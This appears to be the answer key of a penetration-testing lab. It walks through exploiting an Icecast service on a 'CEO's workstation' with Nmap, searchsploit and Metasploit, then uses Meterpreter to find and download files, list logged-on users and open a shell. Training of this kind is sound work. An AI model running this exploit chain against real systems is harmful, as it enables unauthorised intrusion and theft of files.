### Instructions

You've been provided full access to the network and are getting ping responses from the CEOâ€™s workstation.
 
1. Perform a service and version scan using Nmap to determine which services are up and running:

    - Run the Nmap command that performs a service and version scan against the target.

      > Answer: ```nmap -sV 192.168.0.20```
 
 
2. From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:
 
   - Run the SearchSploit commands to show available Icecast exploits.
  
     > Answer: ```searchsploit icecast```

3. Now that we know which exploits are available to us, let's start Metasploit:
 
   - Run the command that starts Metasploit:
    
     > Answer: ```sudo msfconsole```
 
 
4. Search for the Icecast module and load it for use.
 
   - Run the command to search for the Icecast module:
     
     > Answer: ```search icecast```
 

   - Run the command to use the Icecast module:

       **Note:** Instead of copying the entire path to the module, you can use the number in front of it.

     > Answer: ```use 0```
 
 
5. Set the `RHOST` to the target machine.
 
   - Run the command that sets the `RHOST`:
      
     > Answer: ```set RHOST 192.168.0.20```
 
6. Run the Icecast exploit.
 
   - Run the command that runs the Icecast exploit.
      
     > Answer: ```exploit```
 
   - Run the command that performs a search for the `secretfile.txt` on the target.
      
     > Answer: ```search -d C:\\Users -f "secretfile.txt"```
  
 7. You should now have a Meterpreter session open.
 
    - Run the command to performs a search for the `recipe.txt` on the target:

      > Answer: ```search -d C:\\Users -f "recipe.txt"``` 
 
 
    - **Bonus**: Run the command that exfiltrates the `recipe*.txt` file:


      > Answer: Once in directory or add path to directory```download recipe.txt```

 
#### Bonus
  
 
A. Run a Meterpreter post script that enumerates all logged on users.

  > Answer: ```run post/windows/gather/enum_logged_on_users```
 
     
B. Open a Meterpreter shell. 
 
  > Answer: ```shell```
 
C. Run the command that displays the target's computer system information:

   > Answer: ```sysinfo```
